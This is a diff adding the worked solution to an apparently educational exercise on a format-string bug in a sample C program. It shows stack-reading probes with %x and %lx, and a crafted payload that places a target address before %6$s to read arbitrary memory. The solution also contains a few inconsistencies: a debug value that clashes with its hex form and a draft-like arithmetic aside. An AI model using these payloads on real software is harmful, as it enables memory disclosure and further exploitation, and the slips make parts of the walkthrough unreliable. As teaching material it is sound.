+\item If the program's argument contains the format \texttt{"\%s"}, what will happen? Can you choose the address that \texttt{"\%s"} targets and use it to read the value of \texttt{test\_var}?
+\end{enumerate}
+
+\begin{pointcle}
+The call \texttt{printf(texte)} is dangerous because the attacker controls the format string. They can use \texttt{\%x}, \texttt{\%lx}, \texttt{\%s} to read memory, and even \texttt{\%n} to write to memory!
+\end{pointcle}
+\end{exercice}
+
+\begin{correction}
+
+\begin{enumerate}
+\item \textbf{Reading the stack with format specifiers:}
+
+\medskip
+\textbf{Understanding the vulnerability:}
+
+The program has two calls to \texttt{printf} with user input:
+\begin{itemize}
+\item \texttt{printf("\%s", texte)} -- \textbf{Safe}: the format string is controlled by the programmer, \texttt{texte} is treated as data.
+\item \texttt{printf(texte)} -- \textbf{Dangerous}: the user's input IS the format string. If the user includes format specifiers like \texttt{\%x} or \texttt{\%lx}, \texttt{printf} will consume values from the registers and then from the stack.
+\end{itemize}
+
+\medskip
+\textbf{Normal usage:}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out "Hello World" 42
+La bonne facon d'afficher des entrees utilisateurs:
+Hello World
+La mauvaise facon d'afficher des entrees utilisateurs:
+Hello World
+[*] test_var @ 0x404030 = 4210116, 00646464
+[*] adresse de d=0x7fffffffdd08, valeur de d=0x000000000000002a
+[*] adresse de texte=0x7fffffffdb00
+\end{lstlisting}
+
+Both outputs are identical. Note that \texttt{test\_var} = $100 \times 256^2 + 100 \times 256 + 100$ = $6553600 + 25600 + 100$ = $6579300$... Actually, let us compute: $100 \times 65536 + 100 \times 256 + 100 = 6553600 + 25600 + 100 = 6579300$. In hex: \texttt{0x646464}.
+
+\medskip
+\textbf{Exploiting the format string to read the stack:}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out "%08x.%08x.%08x.%08x.%08x.%08x" 42
+La bonne facon d'afficher des entrees utilisateurs:
+%08x.%08x.%08x.%08x.%08x.%08x
+La mauvaise facon d'afficher des entrees utilisateurs:
+ffffe1b8.00000000.00000000.78383025.3830252e.30252e78
+\end{lstlisting}
+
+The safe version prints the format string literally. The vulnerable version interprets each \texttt{\%08x} as a request to read a value. On x86-64, the first few format arguments come from registers (\texttt{rsi}, \texttt{rdx}, \texttt{rcx}, \texttt{r8}, \texttt{r9}), then subsequent ones come from the stack.
+
+\medskip
+\textbf{Using \texttt{\%lx} to read 64-bit values:}
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out "%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx" 42
+\end{lstlisting}
+
+Each \texttt{\%lx} reads an 8-byte value (long) from the argument list. This reveals the contents of the stack: local variables, saved registers, return addresses, etc.
+
+\medskip
+\textbf{Using positional arguments to target specific stack slots:}
+
+The notation \texttt{\%N\$lx} reads the $N$-th argument directly:
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out "%1\$lx %2\$lx %3\$lx %4\$lx %5\$lx %6\$lx %7\$lx %8\$lx" 42
+\end{lstlisting}
+
+This allows reading specific positions in the argument list without consuming all the preceding values. By varying $N$, you can explore the entire stack.
+
+\medskip
+\textbf{Why does \texttt{printf} process these format specifiers?}
+
+When \texttt{printf} encounters a format specifier (\texttt{\%x}, \texttt{\%lx}, \texttt{\%s}, etc.), it reads the next argument from the calling convention's argument locations (registers first, then stack). It has \textbf{no way to know} how many arguments were actually provided -- it blindly trusts the format string. With \texttt{printf(texte)}, the attacker controls the format string and can therefore read (and even write) arbitrary memory.
+
+\item \textbf{Using \texttt{\%s} to read a string at a chosen address:}
+
+\medskip
+\textbf{What happens with \texttt{\%s}:}
+
+The \texttt{\%s} format specifier tells \texttt{printf} to read a \textbf{pointer} from the argument list and then print the null-terminated string at that address. If we can control which value is used as the pointer, we can read arbitrary memory.
+
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out "%s" 42
+\end{lstlisting}
+
+This will try to read a string from whatever address happens to be in the \texttt{rsi} register (the second argument register). This will likely crash with a segfault because that value is probably not a valid address.
+
+\medskip
+\textbf{Controlling the address for \texttt{\%s}:}
+
+The key insight is that the format string itself (\texttt{texte}) lives on the stack. If we place an address at the beginning of our format string, and then use a positional \texttt{\%s} to reference the stack slot where our format string begins, \texttt{printf} will dereference our chosen address.
+
+Strategy:
+\begin{enumerate}
+\item First, determine which positional argument corresponds to the start of the \texttt{texte} buffer on the stack. Use multiple \texttt{\%lx} to identify where you see the bytes of your own format string:
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out "AAAAAAAA%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx.%lx" 42
+\end{lstlisting}
+Look for \texttt{4141414141414141} in the output. If it appears at position $k$, then \texttt{\%k\$s} will dereference the 8-byte value at the start of \texttt{texte}.
+
+\item Then replace the 8 'A' bytes with the address of \texttt{test\_var} (obtained from the debug output: \texttt{0x404030}), followed by \texttt{\%k\$s}:
+\begin{lstlisting}[language=bash,numbers=none]
+$ ./a.out $(python3 -c "import sys; sys.stdout.buffer.write(b'\x30\x40\x40\x00\x00\x00\x00\x00' + b'%6\$s')") 42
+\end{lstlisting}
+(where 6 is replaced by the actual position $k$ you discovered)
+\end{enumerate}
+
+\medskip
+\textbf{Result:}
+
+If the position is correct, \texttt{printf} will:
+\begin{enumerate}
+\item Find the 8-byte value at position $k$ in its argument list
+\item This value is the start of \texttt{texte}, which contains \texttt{0x0000000000404030}
+\item Interpret this as a pointer and print the string at address \texttt{0x404030}
+\item This is the address of \texttt{test\_var}, so it prints the bytes of \texttt{test\_var} interpreted as a string
+\end{enumerate}
+
+Since \texttt{test\_var} = \texttt{0x00646464}, the bytes in memory (little-endian) are \texttt{64 64 64 00}. Interpreted as a string: \texttt{"ddd"} (since \texttt{0x64} = 'd' in ASCII).
+
+\begin{attention}
+\begin{itemize}
+\item The exact positional argument number $k$ depends on your compiler, system, and the size of the format string. You must discover it empirically using \texttt{\%lx} probes.
+\item Null bytes (\texttt{\textbackslash x00}) in the address may cause \texttt{strcpy} to truncate the string prematurely. Placing the address bytes at the end of the format string (using \texttt{\%k\$s} first, then the address) or using direct input methods can help.
+\item On 64-bit systems, addresses in the low range (like \texttt{0x404030}) contain null bytes in the upper bytes, making this exploit trickier than on 32-bit systems.
+\end{itemize}
+\end{attention}
+
+\end{enumerate}
+
+\begin{pointcle}
+\begin{itemize}
+    \item \texttt{printf(texte)} is \textbf{dangerous} because the attacker controls the format string and can read arbitrary memory locations.
+    \item \texttt{printf("\%s", texte)} is \textbf{safe} because the format string is fixed by the programmer.
+    \item Format specifiers like \texttt{\%x}, \texttt{\%lx} allow reading the stack contents (registers, then stack memory).
+    \item The \texttt{\%s} specifier dereferences a pointer from the argument list, enabling reads at arbitrary addresses.
+    \item The \texttt{\%n} specifier (not explored here) can \textbf{write} to memory, making format string bugs exploitable for arbitrary code execution.
+    \item \textbf{Rule:} \textit{Never} pass user-controlled data as the first argument to \texttt{printf} (or \texttt{sprintf}, \texttt{fprintf}, etc.).
+\end{itemize}
+\end{pointcle}
+
+\end{correction}
+
+
+\end{document}
